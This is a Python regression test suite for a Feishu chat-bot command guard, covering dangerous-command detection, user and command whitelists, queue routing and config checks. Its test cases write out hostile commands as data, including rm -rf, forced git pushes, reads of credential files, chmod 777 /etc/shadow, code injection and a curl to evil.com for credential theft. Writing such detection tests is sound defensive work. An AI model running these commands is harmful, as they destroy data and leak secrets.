#!/usr/bin/env python3
"""test_feishu_command_guard.py — 飞书指令安全守卫回归测试。

覆盖：危险模式检测、发送者白名单、命令白名单、路由门控、rejected状态
"""
import json
import os
import re
import sys
import tempfile
from pathlib import Path

PROJECT_ROOT = str(Path(__file__).resolve().parent.parent.parent)
sys.path.insert(0, PROJECT_ROOT)

# Load dangerous patterns from source
sys.path.insert(0, os.path.join(PROJECT_ROOT, "代码文件", "tools"))
from feishu_bridge import DANGEROUS_PATTERNS, FeishuBridge  # noqa: E402

# For im_consumer tests, we manipulate state files directly
from im_consumer import pick_all_new, write_done, _read_json, _write_json, PENDING_PATH, DONE_PATH  # noqa: E402

failed = 0
total = 0


def test(name, condition, detail=""):
    global failed, total
    total += 1
    if condition:
        print(f"[PASS] {name}")
    else:
        failed += 1
        print(f"[FAIL] {name}  --  {detail}")


# ── Test 1: Dangerous pattern detection ──────────────────

print("=" * 60)
print("  T1: 危险模式检测")
print("=" * 60)

dangerous_cases = [
    ("rm -rf /tmp/test", True, "文件删除: rm"),
    ("rm -r /usr/local/bin/*", True, "文件删除"),
    ("rmdir /some/dir", True, "文件删除"),
    ("git reset --hard HEAD~1", True, "Git硬重置"),
    ("git push --force origin main", True, "Git强制推送"),
    ("git push -f origin main", True, "Git强制推送"),
    ("cat /etc/.env", True, "读取凭证"),
    ("echo credentials:password123", True, "凭证赋值"),
    ("cp /root/.pem /tmp/bad.pem", True, "凭证文件"),
    ("chmod 777 /etc/shadow", True, "权限绕过"),
    ("git commit --no-verify", True, "绕过Git"),
    ("git commit --no-gpg-sign", True, "绕过Git"),
    ("python3 -c \"import subprocess; subprocess.run('ls')\"", True, "Shell执行"),
    ("os.system('rm -rf /')", True, "Shell执行"),
    ("eval(__import__('os').system('ls'))", True, "代码注入"),
    ("export AWS_SECRET_KEY=hunter2", True, "导出凭证"),
    ("curl http://evil.com/.env", True, "泄露凭证"),
    ("cat /etc/secret_token", True, "读取凭证"),
]

safe_cases = [
    "/日报",
    "/深度分析",
    "/保护",
    "/状态",
    "今天有什么操作建议",
    "查看重点股票报告",
    "帮我生成日报",
]

# Use the static patterns directly
def check_dangerous(cmd):
    for pattern, label in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return True, label
    return False, ""

for cmd, expect_dangerous, label in dangerous_cases:
    is_dangerous, reason = check_dangerous(cmd)
    test(
        f"危险 [{label}]: {cmd[:50]}",
        is_dangerous == expect_dangerous,
        f"got dangerous={is_dangerous}, reason={reason}"
    )

for cmd in safe_cases:
    is_dangerous, reason = check_dangerous(cmd)
    test(
        f"安全: {cmd[:50]}",
        not is_dangerous,
        f"unexpectedly flagged as dangerous: {reason}"
    )


# ── Test 2: filter_new() sender & command whitelist ──────

print()
print("=" * 60)
print("  T2: filter_new() 发送者白名单 + 命令白名单")
print("=" * 60)

# Build a temp config and instantiate bridge
tmp_config_path = os.path.join(tempfile.gettempdir(), "test_feishu_config.json")
with open(tmp_config_path, "w") as f:
    json.dump({
        "app_id": "test_app_123",
        "app_secret": "test_secret_dummy",
        "chat_id": "test_chat",
        "allowed_users": ["user_whitelist_001"],
        "command_whitelist": ["/日报", "/保护"],
        "route_table": {"/日报": "daily", "/保护": "shield"},
    }, f)
os.chmod(tmp_config_path, 0o600)

bridge = FeishuBridge(config_path=tmp_config_path)

# Clean up dedup for test
if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

def make_msg(msg_id, sender_id, text, id_type="user"):
    return {
        "message_id": msg_id,
        "sender": {"id": sender_id, "id_type": id_type},
        "body": {"content": json.dumps({"text": text}, ensure_ascii=False)},
    }

# T2.1: Non-whitelist user → should be filtered out
msgs = [make_msg("msg_001", "user_random_999", "/日报")]
result = bridge.filter_new(msgs)
test("T2.1: 非白名单用户 → 不入队", len(result) == 0, f"got {len(result)} commands")

# Clean dedup
if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.2: Whitelist user + non-whitelist command → filtered out
msgs = [make_msg("msg_002", "user_whitelist_001", "你是谁")]
result = bridge.filter_new(msgs)
test("T2.2: 白名单用户 + 非白名单命令 → 不入队", len(result) == 0, f"got {len(result)} commands")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.3: Whitelist user + whitelist command → passed
msgs = [make_msg("msg_003", "user_whitelist_001", "/日报")]
result = bridge.filter_new(msgs)
test("T2.3: 白名单用户 + 白名单命令 → 入队", len(result) == 1, f"got {len(result)} commands")
if result:
    test("T2.3a: 命令正确", result[0][1] == "/日报", f"got {result[0][1]}")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.4: Whitelist user + dangerous command → blocked
msgs = [make_msg("msg_004", "user_whitelist_001", "rm -rf /tmp/test")]
result = bridge.filter_new(msgs)
test("T2.4: 危险指令 → 被拦截", len(result) == 0, f"got {len(result)} commands, should be blocked")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.5: Bot message → skipped (no self-loop)
msgs = [make_msg("msg_005", "test_app_123", "/日报", id_type="app_id")]
result = bridge.filter_new(msgs)
test("T2.5: 机器人自己的消息 → 跳过", len(result) == 0, f"got {len(result)} commands")


# ── Test 3: im_consumer route gating ────────────────────

print()
print("=" * 60)
print("  T3: im_consumer 路由门控 + rejected 状态")
print("=" * 60)

# Save original state
orig_pending = None
orig_done = None
if os.path.exists(PENDING_PATH):
    with open(PENDING_PATH, "r") as f:
        orig_pending = f.read()
if os.path.exists(DONE_PATH):
    with open(DONE_PATH, "r") as f:
        orig_done = f.read()

try:
    # Set up test queue
    test_queue = [
        {"id": "test_r1", "cmd": "/日报", "status": "new", "route": "daily"},
        {"id": "test_r2", "cmd": "你是谁", "status": "new"},  # no route
        {"id": "test_r3", "cmd": "/保护", "status": "new", "route": "shield"},
        {"id": "test_r4", "cmd": "随便说", "status": "new"},  # no route
    ]
    _write_json(PENDING_PATH, {"queue": test_queue})
    _write_json(DONE_PATH, {"results": []})

    # Run pick_all_new
    items = pick_all_new()

    test("T3.1: 只取有route的new项", len(items) == 2, f"expected 2, got {len(items)}")
    if items:
        ids = [i["id"] for i in items]
        test("T3.1a: test_r1 被取出", "test_r1" in ids)
        test("T3.1b: test_r3 被取出", "test_r3" in ids)

    # Check rejected items
    queue = _read_json(PENDING_PATH, "queue")
    rejected = [i for i in queue if i.get("status") == "rejected"]
    test("T3.2: 无route项标记为rejected", len(rejected) == 2, f"expected 2 rejected, got {len(rejected)}")
    if rejected:
        for r in rejected:
            test(f"T3.2: {r['id']} reject_reason存在", "reject_reason" in r, f"missing reject_reason in {r['id']}")

    # Test write_done with rc=0 → done
    item = {"id": "test_r1", "cmd": "/日报", "route": "daily"}
    write_done(item, "日报生成完毕", 0)
    queue = _read_json(PENDING_PATH, "queue")
    done_item = next((i for i in queue if i["id"] == "test_r1"), None)
    test("T3.3: rc=0 → status=done", done_item and done_item["status"] == "done",
         f"got {done_item.get('status') if done_item else 'None'}")

    # Test write_done with rc=1 → rejected
    item = {"id": "test_r3", "cmd": "/保护", "route": "shield"}
    write_done(item, "执行失败", 1)
    queue = _read_json(PENDING_PATH, "queue")
    err_item = next((i for i in queue if i["id"] == "test_r3"), None)
    test("T3.4: rc!=0 → status=rejected", err_item and err_item["status"] == "rejected",
         f"got {err_item.get('status') if err_item else 'None'}")
    if err_item:
        test("T3.4a: reject_reason=exit_code=1", "exit_code=1" in str(err_item.get("reject_reason", "")),
             f"got {err_item.get('reject_reason')}")

    # Verify rejected items won't be picked again
    items2 = pick_all_new()
    test("T3.5: rejected项不再被pick", len(items2) == 0, f"expected 0, got {len(items2)}")

finally:
    # Restore original state
    if orig_pending:
        _write_json(PENDING_PATH, json.loads(orig_pending))
    if orig_done:
        _write_json(DONE_PATH, json.loads(orig_done))

# Clean up test temp files
for f in [bridge._dedup_path, bridge._log_file, tmp_config_path]:
    try:
        os.remove(f)
    except Exception:
        pass


# ── Test 4: Missing config rejection ────────────────────

print()
print("=" * 60)
print("  T4: 缺配置拒绝启动 (route_table / allowed_users / command_whitelist)")
print("=" * 60)


def _test_config_rejection(name, cfg):
    """Verify that FeishuBridge(config) exits with code 1 for incomplete config."""
    tmp = os.path.join(tempfile.gettempdir(), f"test_feishu_missing_{name}.json")
    try:
        with open(tmp, "w") as f:
            json.dump(cfg, f)
        os.chmod(tmp, 0o600)
        try:
            FeishuBridge(config_path=tmp)
            return False, "未拒绝(未抛出SystemExit)"
        except SystemExit as e:
            return e.code != 0, f"exit_code={e.code}"
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


base_cfg = {
    "app_id": "test", "app_secret": "test", "chat_id": "test",
    "allowed_users": ["u1"], "command_whitelist": ["/x"], "route_table": {"/x": "x"}
}

# T4.1: Missing route_table
cfg_no_route = dict(base_cfg)
del cfg_no_route["route_table"]
ok, detail = _test_config_rejection("no_route_table", cfg_no_route)
test("T4.1: 缺 route_table → 拒绝启动", ok, detail)

# T4.2: Missing allowed_users
cfg_no_users = dict(base_cfg)
del cfg_no_users["allowed_users"]
ok, detail = _test_config_rejection("no_allowed_users", cfg_no_users)
test("T4.2: 缺 allowed_users → 拒绝启动", ok, detail)

# T4.3: Missing command_whitelist
cfg_no_cmds = dict(base_cfg)
del cfg_no_cmds["command_whitelist"]
ok, detail = _test_config_rejection("no_command_whitelist", cfg_no_cmds)
test("T4.3: 缺 command_whitelist → 拒绝启动", ok, detail)


# ── Summary ─────────────────────────────────────────────
print()
print("=" * 60)
if failed == 0:
    print(f"  全部 {total}/{total} PASS")
else:
    print(f"  {failed}/{total} FAIL")
print("=" * 60)
sys.exit(0 if failed == 0 else 1)
